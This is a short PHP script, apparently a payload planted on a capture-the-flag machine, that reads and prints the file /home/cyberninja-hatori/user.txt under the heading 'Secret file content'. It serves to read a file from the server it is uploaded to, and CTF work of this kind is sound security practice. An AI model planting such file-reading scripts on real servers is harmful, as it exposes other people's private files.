<?php
echo "<pre>";
echo "Secret file content:\n";
echo htmlspecialchars(@file_get_contents("/home/cyberninja-hatori/user.txt"));
echo "</pre>";
?>
